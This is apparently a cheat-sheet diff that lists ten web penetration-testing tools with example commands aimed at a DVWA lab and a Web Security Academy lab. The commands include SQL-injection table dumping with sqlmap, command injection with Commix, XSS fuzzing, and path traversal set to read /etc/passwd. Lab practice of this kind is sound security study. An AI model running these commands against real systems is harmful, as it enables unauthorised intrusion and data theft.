@@ -1,0 +1,29 @@
+1-Burpsuite
+
+2-Amass
+example: amass enum -passive -d example.com,test.com,target.org
+
+3-Katana
+example: katana -u "http://192.168.1.10" -H "Cookie: PHPSESSID=nnibls7dak1losghr7q6hbt6j6; security=low" -rl 5 -delay 1 -timeout 30 -d 5 -headless
+
+4-Dirb
+example: dirb http://192.168.1.10 -H "Cookie: PHPSESSID=nnibls7dak1losghr7q6hbt6j6; security=low"
+
+5-Fuff
+example: ffuf -u "http://192.168.1.10/vulnerabilities/xss_r/?name=FUZZ" -w testlist.txt -H "Cookie: PHPSESSID=nnibls7dak1losghr7q6hbt6j6; security=low" -mc 200 -t 20
+
+6-Nuclei
+example: nuclei -u "http://192.168.1.10/vulnerabilities/xss_r/?name=Magdy" -H "Cookie: PHPSESSID=nnibls7dak1losghr7q6hbt6j6; security=low" --timeout 10 
+
+7-Dalfox
+example: dalfox url "http://192.168.1.10/vulnerabilities/xss_r/?name=Magdy" -X "GET"  -H "Cookie: PHPSESSID=nnibls7dak1losghr7q6hbt6j6; security=low" --timeout 60 --delay 10
+
+8-Sqlmap
+example: sqlmap -u "http://192.168.1.10/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=nnibls7dak1losghr7q6hbt6j6; security=low" --level=5 --risk=3 --batch -D dvwa --tables
+
+9-Commix
+example: python commix.py -u "http://192.168.1.10/vulnerabilities/exec/" --data="ip=1.1.1.1&submit=submit" --headers="Cookie: PHPSESSID=nnibls7dak1losghr7q6hbt6j6; security=low" --method=POST --level=3 --batch
+
+10-Dotdotpwn
+example: dotdotpwn -m http-url -u 'https://0a0900d1039ef266805b6ca5006500cc.web-security-academy.net/image?filename=TRAVERSAL' -f '/etc/passwd' -d 6 -k 'root:' -b
+
